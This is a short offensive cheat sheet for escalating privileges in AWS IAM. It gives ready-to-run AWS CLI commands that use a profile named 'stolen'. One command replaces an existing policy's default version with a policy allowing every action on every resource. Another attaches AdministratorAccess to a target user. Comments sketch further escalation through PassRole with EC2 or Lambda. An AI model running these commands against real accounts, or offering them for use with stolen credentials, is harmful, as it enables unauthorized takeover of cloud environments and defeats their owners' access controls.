## 🔐 IAM Privilege Escalation

```bash
# If you have iam:CreatePolicyVersion
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/ExistingPolicy \
  --policy-document file://admin-policy.json \
  --set-as-default --profile stolen

# admin-policy.json
{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
}

# If you have iam:AttachUserPolicy
aws iam attach-user-policy \
  --user-name target-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \
  --profile stolen

# If you have iam:PassRole + ec2:RunInstances
# Launch EC2 with admin role attached

# If you have lambda:CreateFunction + iam:PassRole
# Create lambda with admin role and invoke it
```

